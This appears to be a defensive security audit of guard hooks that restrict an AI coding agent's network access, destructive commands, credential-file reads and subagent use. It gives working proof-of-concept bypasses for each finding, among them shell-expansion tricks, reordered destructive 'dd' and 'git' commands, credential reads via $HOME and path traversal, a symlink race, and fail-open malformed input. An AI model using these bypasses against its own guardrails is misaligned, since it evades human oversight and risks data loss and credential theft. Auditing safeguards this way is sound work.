# Claude Code Hooks Security Audit Report

**Date:** 2026-02-15
**Auditor:** Claude Code (Opus 4.5)
**Scope:** All shell script hooks in claude-orchestrator

---

## 1) Executive Summary

This audit identified **10 security findings** across the hook set.
Most critical issues are bypasses in command/path matching and error handling patterns that can result in **implicit allow** behavior.

Risk overview:
- **High:** 5
- **Medium:** 5
- **Low:** 0
- **Critical:** 0

Primary themes:
- Regex-based detection without canonicalization is bypassable.
- Multiple hooks trust unnormalized input (`$CLAUDE_TOOL_INPUT`, command text, transcript line text).
- `jq` parse/runtime errors are not handled explicitly with deterministic deny behavior.

---

## 2) Scope

Reviewed hook files:

| Directory | File |
|-----------|------|
| `security-hooks/` | `restrict-bash-network.sh` |
| `security-hooks/` | `block-destructive-commands.sh` |
| `security-hooks/` | `guard-sensitive-reads.sh` |
| `gemini-web-mcp/hooks/` | `require-web-if-recency.sh` |
| `gemini-web-mcp/hooks/` | `inject-web-search-hint.sh` |
| `codex-delegations/hooks/` | `block-explore-for-codex.sh` |
| `codex-delegations/hooks/` | `block-test-gen-for-codex.sh` |
| `codex-delegations/hooks/` | `block-doc-comments-for-codex.sh` |
| `codex-delegations/hooks/` | `block-diff-digest-for-codex.sh` |
| `codex-delegations/hooks/` | `inject-codex-hint.sh` |
| `codex-delegations/hooks/` | `log-codex-delegation.sh` |

---

## 3) Methodology

- Static review of all hook scripts with exact line mapping.
- Dynamic black-box testing by piping crafted JSON payloads to each hook.
- Validation of bypasses with command-level PoCs and observed hook output/exit behavior.

---

## 4) Findings

### HOOK-SEC-001: Shell Expansion Bypass in Network Restriction

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Affected File(s)** | `security-hooks/restrict-bash-network.sh:14`, `security-hooks/restrict-bash-network.sh:18` |
| **CVSS Justification** | High exploitability (trivial payload), high control impact (full network access) |

#### Description

Detection relies on regex over raw command text after limited character stripping. Shell variable/command expansion forms can evade direct token matching.

#### Technical Analysis

```bash
command="$(... | tr -d "'\"\`\\\\" | tr -s '[:space:]' ' ')"
...
grep -Eiq '(^|[;&| ])(curl|wget|nc|...)'
```

The regex matches literal command names but cannot detect:
- Variable indirection (`$var` where var=curl)
- Command substitution (`$(printf c)url`)
- IFS manipulation (`curl${IFS}url`)

#### Detailed Proof of Concept

**PoC 1: Variable Indirection**
```bash
printf '%s' '{"tool_input":{"command":"C=curl; $C https://example.com"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 2: Command Substitution**
```bash
printf '%s' '{"tool_input":{"command":"$(printf c)url https://example.com"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 3: IFS Manipulation**
```bash
printf '%s' '{"tool_input":{"command":"curl${IFS}https://example.com"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

#### Impact

Direct network access can occur despite policy, bypassing required MCP web mediation. An attacker could exfiltrate data or fetch malicious payloads.

#### Remediation

1. Parse command via shell-aware tokenizer/AST, not regex on raw strings.
2. Expand a strict allowlist model (deny by default for Bash network tools).
3. Block suspicious expansion constructs: `$(...)`, `${...}`, indirect expansion, `eval`, `bash -c`, `sh -c`.

---

### HOOK-SEC-002: Incomplete Network Tool Coverage

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Affected File(s)** | `security-hooks/restrict-bash-network.sh:18` |
| **CVSS Justification** | Easy exploitability, moderate-to-high policy bypass impact |

#### Description

Regex denylist omits many network-capable commands including `git` (HTTPS operations), `openssl s_client`, package managers, and DNS utilities.

#### Technical Analysis

Pattern includes `curl|wget|nc|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|ftp` but excludes:
- `git clone/fetch/push/pull` over HTTPS
- `openssl s_client`
- `pip install` from URLs
- `npm install` from URLs
- `dig`, `nslookup`, `host`

#### Detailed Proof of Concept

**PoC 1: Git HTTPS Access**
```bash
printf '%s' '{"tool_input":{"command":"git ls-remote https://github.com/octocat/Hello-World.git"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
```

**PoC 2: OpenSSL Network Connection**
```bash
printf '%s' '{"tool_input":{"command":"openssl s_client -connect example.com:443"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
```

**PoC 3: Package Manager Network Access**
```bash
printf '%s' '{"tool_input":{"command":"pip install https://evil.com/malware.tar.gz"}}' \
| bash security-hooks/restrict-bash-network.sh
# Observed: no output (allowed)
```

#### Impact

Attacker/operator can perform outbound network actions through non-blocked binaries, defeating the purpose of network restriction.

#### Remediation

1. Move from denylist to capability-based policy.
2. Block all external network by default for Bash in this hook layer.
3. Allow only explicitly approved commands/flags.

---

### HOOK-SEC-003: Flag Ordering Bypass in Destructive Command Blocker

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Affected File(s)** | `security-hooks/block-destructive-commands.sh:26-27` |
| **CVSS Justification** | Easy exploitation, direct destructive action risk |

#### Description

Regex expects specific token ordering and misses equivalent destructive forms when flags appear in different positions.

#### Technical Analysis

```bash
grep -Eiq '... git\s+(... push\s+(--force|-f)|clean\s+-f ...)|dd\s+if='
```

The pattern `git\s+push\s+(--force|-f)` requires `--force` immediately after `push`, missing `git push origin main --force`.

The pattern `dd\s+if=` requires `if=` immediately after `dd`, missing `dd of=/dev/sda if=/dev/zero`.

#### Detailed Proof of Concept

**PoC 1: Git Force Push with Remote First**
```bash
printf '%s' '{"tool_input":{"command":"git push origin main --force"}}' \
| bash security-hooks/block-destructive-commands.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 2: DD with Reversed Arguments**
```bash
printf '%s' '{"tool_input":{"command":"dd of=/dev/sda if=/dev/zero"}}' \
| bash security-hooks/block-destructive-commands.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 3: Git Checkout with Double Dash**
```bash
printf '%s' '{"tool_input":{"command":"git checkout -- ."}}' \
| bash security-hooks/block-destructive-commands.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 4: Git Clean with Extended Flags**
```bash
printf '%s' '{"tool_input":{"command":"git clean -xdf"}}' \
| bash security-hooks/block-destructive-commands.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 5: RM with Interleaved Flags**
```bash
printf '%s' '{"tool_input":{"command":"rm -I -rf /tmp/important"}}' \
| bash security-hooks/block-destructive-commands.sh
# Observed: no output (allowed)
```

#### Impact

Potential for data loss, history rewrite, and destructive repository/system operations.

#### Remediation

1. Parse argv robustly; match semantic intent regardless of flag order.
2. Canonicalize commands and inspect option sets.
3. Prefer explicit allowlist of safe operations over fragile deny regexes.

---

### HOOK-SEC-004: Path Traversal and Variable Expansion Bypass in Sensitive Reads

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Affected File(s)** | `security-hooks/guard-sensitive-reads.sh:54-65` |
| **CVSS Justification** | Secret exposure risk, high exploitability |

#### Description

In Bash mode, the hook scans command text without path canonicalization or shell expansion awareness. Path traversal sequences and variable forms can evade regex matching.

#### Technical Analysis

```bash
raw_command=$(... '.tool_input.command // ""')
target=$(printf '%s' "$raw_command" | tr -d ... )
...
"(${expanded_home}|~)/\.aws"
```

The pattern matches literal `~/.aws` or `/home/user/.aws` but not:
- Traversal: `/home/user/work/../.aws`
- Variables: `$HOME/.aws`
- Mixed: `${HOME}/.aws/credentials`

#### Detailed Proof of Concept

**PoC 1: Path Traversal**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /home/me/work/../.aws/credentials"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 2: $HOME Variable**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat $HOME/.aws/credentials"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 3: ${HOME} Variable**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat ${HOME}/.ssh/id_rsa"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 4: Double Traversal**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /tmp/../../home/me/.claude.json"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

#### Impact

Sensitive credential files (.aws, .ssh, .claude.json) can be read by obfuscated path forms, leading to credential theft.

#### Remediation

1. For Bash mode, extract path operands and resolve canonical paths before matching.
2. Expand/resolve `$HOME`, `~`, relative segments, and symlinks.
3. Detect read tools plus file operands via parser rather than regex string matching.

---

### HOOK-SEC-005: `.pem` Suffix-Only Rule Bypass

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Affected File(s)** | `security-hooks/guard-sensitive-reads.sh:74` |
| **CVSS Justification** | Private key exposure, high exploitability |

#### Description

`.pem` detection anchors at end-of-string (`\.pem$`) and fails when command includes additional shell syntax like pipes or redirects.

#### Technical Analysis

```bash
"\.pem$"
```

This matches `cat secret.pem` but not `cat secret.pem | head` or `cat secret.pem > /tmp/out`.

#### Detailed Proof of Concept

**PoC 1: Pipe After .pem**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /secrets/prod.pem | sed -n 1p"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
# Expected: JSON deny output
```

**PoC 2: Redirect After .pem**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /secrets/server.pem > /tmp/key"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
```

**PoC 3: Command Chain**
```bash
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat key.pem && echo done"}}' \
| bash security-hooks/guard-sensitive-reads.sh
# Observed: no output (allowed)
```

#### Impact

Private key material in `.pem` files may be read via piped/compound commands.

#### Remediation

1. Match `.pem` as token/operand boundary, not only end-of-line.
2. Use pattern: `\.pem(\s|$|[|;&>])`
3. Parse command chains and inspect each file operand.

---

### HOOK-SEC-006: TOCTOU Race in Read-Mode Sensitive Guard

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Affected File(s)** | `security-hooks/guard-sensitive-reads.sh:37-44` |
| **CVSS Justification** | Medium likelihood, high impact if exploited |

#### Description

The hook checks path state (`-e`, `realpath`, `readlink`) before tool execution, allowing a race condition if file/symlink target changes after validation but before the actual read.

#### Technical Analysis

```bash
if [[ -e "$raw_path" ]]; then
  target=$(realpath -e -- "$raw_path" ...)
  if [[ -L "$raw_path" ]]; then
    link_target=$(readlink -f -- "$raw_path" ...)
```

Time-of-check vs time-of-use: the path is validated, then control returns to the caller which performs the actual read. An attacker with write access can swap the symlink target in between.

#### Detailed Proof of Concept

**Setup: Racing Symlink Swap**

Terminal A (attacker loop):
```bash
while true; do
  ln -sfn /tmp/safe.txt /tmp/race-link
  ln -sfn ~/.aws/credentials /tmp/race-link
done
```

Terminal B (trigger reads):
```bash
for i in {1..100}; do
  printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"/tmp/race-link"}}' \
  | bash security-hooks/guard-sensitive-reads.sh
done
# Some iterations will check when pointing to safe.txt,
# but actual read occurs when pointing to credentials
```

#### Impact

Sensitive data may be read if link target changes post-check/pre-use.

#### Remediation

1. Enforce checks inside the actual read executor using opened file descriptor semantics.
2. Re-validate target at point of use (open with O_NOFOLLOW, check after open).
3. Avoid multi-step check/use split on mutable paths.

---

### HOOK-SEC-007: Whitespace Normalization Bypass in Subagent Blockers

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Affected File(s)** | `codex-delegations/hooks/block-explore-for-codex.sh:8-10` |
| | `codex-delegations/hooks/block-test-gen-for-codex.sh:8-10` |
| | `codex-delegations/hooks/block-doc-comments-for-codex.sh:8-10` |
| | `codex-delegations/hooks/block-diff-digest-for-codex.sh:8-10` |
| **CVSS Justification** | High exploitability, policy bypass |

#### Description

`subagent_type` is lowercased but not trimmed; leading/trailing whitespace bypasses exact string comparisons.

#### Technical Analysis

```bash
subagent="$(echo "$CLAUDE_TOOL_INPUT" | jq -r '.subagent_type // ""' | tr '[:upper:]' '[:lower:]')"
if [[ "$subagent" == "explore" ]]; then ...
```

The value `" explore "` (with spaces) does not equal `"explore"`.

#### Detailed Proof of Concept

**PoC 1: Leading/Trailing Whitespace**
```bash
env CLAUDE_TOOL_INPUT='{"subagent_type":" explore "}' \
bash codex-delegations/hooks/block-explore-for-codex.sh <<< '{"tool_name":"Task"}'
# Observed: {"decision":"allow"}
# Expected: {"decision":"block",...}
```

**PoC 2: Tab Characters**
```bash
env CLAUDE_TOOL_INPUT='{"subagent_type":"\texplore\t"}' \
bash codex-delegations/hooks/block-explore-for-codex.sh <<< '{"tool_name":"Task"}'
# Observed: {"decision":"allow"}
```

**PoC 3: Newline Injection**
```bash
env CLAUDE_TOOL_INPUT='{"subagent_type":"explore\n"}' \
bash codex-delegations/hooks/block-test-gen-for-codex.sh <<< '{"tool_name":"Task"}'
# Observed: {"decision":"allow"}
```

#### Impact

Hard-block policy on disallowed subagents can be bypassed, allowing use of Explore, test_gen, etc.

#### Remediation

1. Trim whitespace: `| tr -d '[:space:]'` or `| xargs`
2. Normalize delimiters before comparison.
3. Optionally enforce strict enum validation on `subagent_type`.

---

### HOOK-SEC-008: Unbound Environment Variable Crash

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Affected File(s)** | `codex-delegations/hooks/block-explore-for-codex.sh:3,8` |
| | `codex-delegations/hooks/block-test-gen-for-codex.sh:3,8` |
| | `codex-delegations/hooks/block-doc-comments-for-codex.sh:3,8` |
| | `codex-delegations/hooks/block-diff-digest-for-codex.sh:3,8` |
| **CVSS Justification** | Single-condition bypass if runtime treats hook failure as non-blocking |

#### Description

`CLAUDE_TOOL_INPUT` is dereferenced under `set -u` without defaulting, causing immediate script failure (exit 1) when the variable is unset.

#### Technical Analysis

```bash
set -euo pipefail
subagent="$(echo "$CLAUDE_TOOL_INPUT" | jq -r '.subagent_type // ""' ...)"
```

When `CLAUDE_TOOL_INPUT` is unset, bash exits immediately with "unbound variable" error.

#### Detailed Proof of Concept

```bash
unset CLAUDE_TOOL_INPUT
bash codex-delegations/hooks/block-explore-for-codex.sh <<< '{"tool_name":"Task"}'
# Observed: line 8: CLAUDE_TOOL_INPUT: unbound variable
# Exit code: 1
# No JSON output emitted
```

```bash
bash codex-delegations/hooks/block-test-gen-for-codex.sh <<< '{"tool_name":"Task"}'
# Observed: line 8: CLAUDE_TOOL_INPUT: unbound variable
# Exit code: 1
```

#### Impact

Hook stops enforcing block logic due to environment shape mismatch. If the hook runner treats non-zero exit as "allow", the block is bypassed.

#### Remediation

1. Use safe default: `"${CLAUDE_TOOL_INPUT:-{}}"`
2. Add explicit error branch returning deterministic deny on malformed/missing input.
3. Test hooks with missing environment variables in CI.

---

### HOOK-SEC-009: Systemic jq Error Handling Gap (Fail-Open Risk)

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Affected File(s)** | All hooks using jq: |
| | `security-hooks/restrict-bash-network.sh:8` |
| | `security-hooks/block-destructive-commands.sh:7` |
| | `security-hooks/guard-sensitive-reads.sh:9,33,54` |
| | `gemini-web-mcp/hooks/require-web-if-recency.sh:13` |
| | `gemini-web-mcp/hooks/inject-web-search-hint.sh:8` |
| | `codex-delegations/hooks/block-*.sh:5` |
| | `codex-delegations/hooks/inject-codex-hint.sh:7` |
| | `codex-delegations/hooks/log-codex-delegation.sh:15` |
| **CVSS Justification** | Medium likelihood, high impact (complete bypass) |

#### Description

Malformed JSON causes `jq` parse failures and nonzero exits with no structured deny output. Combined with `set -e`, the script terminates immediately without emitting a decision.

#### Technical Analysis

No hooks implement patterns like:
```bash
if ! value=$(jq ... 2>/dev/null); then
  deny "malformed input"
fi
```

Instead, jq failures cause immediate exit.

#### Detailed Proof of Concept

**PoC 1: Malformed JSON to Network Hook**
```bash
printf '%s' '{bad-json' | bash security-hooks/restrict-bash-network.sh
echo "Exit code: $?"
# Observed: jq parse error, exit code 5
# No deny JSON emitted
```

**PoC 2: Malformed JSON to Destructive Command Hook**
```bash
printf '%s' 'not json at all' | bash security-hooks/block-destructive-commands.sh
echo "Exit code: $?"
# Observed: jq parse error, exit code 5
```

**PoC 3: Malformed JSON to Recency Hook**
```bash
printf '%s' '{"incomplete":' | bash gemini-web-mcp/hooks/require-web-if-recency.sh
echo "Exit code: $?"
# Observed: jq parse error, exit code 5
```

**PoC 4: Empty Input**
```bash
printf '' | bash security-hooks/guard-sensitive-reads.sh
echo "Exit code: $?"
# Observed: jq parse error or empty handling issue
```

#### Impact

If hook runner treats script errors as pass-through (non-blocking), enforcement is completely bypassed for malformed events. An attacker who can inject malformed JSON into the hook input stream bypasses all security checks.

#### Remediation

1. Wrap every `jq` extraction with explicit error handling.
2. On parse failure: emit deterministic deny (for security hooks) or safe block/retry guidance (for stop hooks).
3. Pattern to adopt:
   ```bash
   if ! payload=$(jq -e '.' 2>/dev/null); then
     echo '{"decision":"block","reason":"malformed input"}'
     exit 0
   fi
   ```
4. Add contract tests for malformed payloads and missing fields.

---

### HOOK-SEC-010: Fake URL Bypass in Recency Enforcement

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Affected File(s)** | `gemini-web-mcp/hooks/require-web-if-recency.sh:30-32` |
| **CVSS Justification** | High exploitability, moderate impact |

#### Description

The hook only checks for presence of `https?://` substring, not URL validity or source authenticity. Any text containing a URL-like string satisfies the check.

#### Technical Analysis

```bash
if ... recency-keywords ...; then
  if ! echo "$last_output" | grep -Eiq 'https?://'; then
    # block
  fi
fi
```

The check passes if the output contains any URL-like string, even fabricated ones.

#### Detailed Proof of Concept

**PoC 1: Fake URL**
```bash
# Create a fake transcript with fabricated source
cat > /tmp/fake-transcript.jsonl << 'EOF'
{"role":"assistant","content":"As of today, the API has changed significantly. Source: https://example.invalid/fake-source"}
EOF

printf '%s' '{"transcript_path":"/tmp/fake-transcript.jsonl"}' \
| bash gemini-web-mcp/hooks/require-web-if-recency.sh
# Observed: no output (allowed)
# The fake URL satisfied the check
```

**PoC 2: URL in Unrelated Context**
```bash
cat > /tmp/fake-transcript.jsonl << 'EOF'
{"role":"assistant","content":"The latest data shows X changed today. By the way, visit https://unrelated.com for more."}
EOF

printf '%s' '{"transcript_path":"/tmp/fake-transcript.jsonl"}' \
| bash gemini-web-mcp/hooks/require-web-if-recency.sh
# Observed: no output (allowed)
```

#### Impact

Unverified/fabricated sources can satisfy the check, undermining the recency assurance policy. Users may receive information claimed to be current but without actual verification.

#### Remediation

1. Validate URLs structurally (parse and check domain).
2. Require that citations correspond to actual web tool invocation metadata in the transcript.
3. Tie citation requirement to `web_search` tool output, not raw text URL presence.

---

## 5) Risk Matrix

| ID | Title | Severity | Likelihood | Impact |
|----|-------|----------|------------|--------|
| HOOK-SEC-001 | Shell expansion bypass in network restriction | High | High | High |
| HOOK-SEC-002 | Incomplete network tool coverage | Medium | High | Medium |
| HOOK-SEC-003 | Flag-order bypass in destructive command blocker | High | High | High |
| HOOK-SEC-004 | Path traversal/var expansion bypass in sensitive reads | High | High | High |
| HOOK-SEC-005 | `.pem` suffix-only bypass | Medium | High | Medium |
| HOOK-SEC-006 | TOCTOU race in Read-mode sensitive guard | Medium | Medium | High |
| HOOK-SEC-007 | Whitespace bypass in subagent blockers | Medium | High | Medium |
| HOOK-SEC-008 | Unset env var crash in subagent blockers | High | Medium | High |
| HOOK-SEC-009 | Systemic jq parse error handling gap | High | Medium | High |
| HOOK-SEC-010 | Fake URL bypass in recency enforcement | Medium | High | Medium |

---

## 6) Recommendations (Prioritized)

### Priority 1: Critical Fixes (Address Immediately)

1. **Implement fail-secure parsing wrappers** for all hooks
   - Create a central helper for JSON parsing with explicit deny/block on parse failures
   - All security hooks should emit `{"decision":"block"}` on any error condition

2. **Fix environment variable handling** in subagent blockers
   - Use `"${CLAUDE_TOOL_INPUT:-{}}"` pattern
   - Add explicit validation for required fields

### Priority 2: High-Impact Improvements

3. **Replace regex-only command checks with parser-based analysis**
   - Normalize argv before inspection
   - Inspect flags independent of order
   - Evaluate shell metacharacters and expansions

4. **Adopt deny-by-default posture** for high-risk tools
   - Allowlist safe Bash commands rather than denylist dangerous ones
   - Block all network access by default, allowlist specific safe operations

5. **Canonicalize file paths** in Bash-mode sensitive read checks
   - Resolve `$HOME`, `~`, `${HOME}` before matching
   - Resolve `..` path segments
   - Follow symlinks for validation

### Priority 3: Defense in Depth

6. **Harden subagent blockers**
   - Trim whitespace from all string comparisons
   - Strict-validate enum values against known set

7. **Strengthen recency/source enforcement**
   - Require evidence of actual `web_search` invocation
   - Validate URLs against tool output metadata

### Priority 4: Process Improvements

8. **Add automated security regression tests**
   - Include all PoCs from this report as CI test cases
   - Expected outcome: deny/block for each bypass attempt

9. **Document hook runtime failure semantics**
   - Define and enforce fail-closed behavior for all security hooks
   - Document expected behavior when hooks crash or timeout

---

## 7) Appendix

### A) Quick Reproduction Commands

```bash
# HOOK-SEC-001: Network bypass via variable indirection
printf '%s' '{"tool_input":{"command":"C=curl; $C https://example.com"}}' \
| bash security-hooks/restrict-bash-network.sh

# HOOK-SEC-003: Destructive command bypass via flag reordering
printf '%s' '{"tool_input":{"command":"git push origin main --force"}}' \
| bash security-hooks/block-destructive-commands.sh

# HOOK-SEC-004: Sensitive read bypass via path traversal
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /home/me/work/../.aws/credentials"}}' \
| bash security-hooks/guard-sensitive-reads.sh

# HOOK-SEC-007: Subagent bypass via whitespace
env CLAUDE_TOOL_INPUT='{"subagent_type":" explore "}' \
bash codex-delegations/hooks/block-explore-for-codex.sh <<< '{"tool_name":"Task"}'

# HOOK-SEC-008: Subagent bypass via unset env var
unset CLAUDE_TOOL_INPUT
bash codex-delegations/hooks/block-explore-for-codex.sh <<< '{"tool_name":"Task"}'

# HOOK-SEC-009: Bypass via malformed JSON
printf '%s' '{bad-json' | bash security-hooks/restrict-bash-network.sh
```

### B) Testing Methodology Notes

- All PoCs were validated by direct hook execution with observed outputs and exit codes.
- For TOCTOU (HOOK-SEC-006), exploitability depends on runtime sequencing and requires write access to create racing symlinks.
- No automated exploitation framework was used; all tests are manual command-line invocations.

### C) Files Not Reviewed

The following files were present but not security-critical:
- `inject-web-search-hint.sh` — Soft guidance only, no security enforcement
- `inject-codex-hint.sh` — Soft guidance only, no security enforcement
- `log-codex-delegation.sh` — Audit logging only, no security enforcement

---

**Report Generated:** 2026-02-15
**Tool Version:** Claude Code (Opus 4.5)
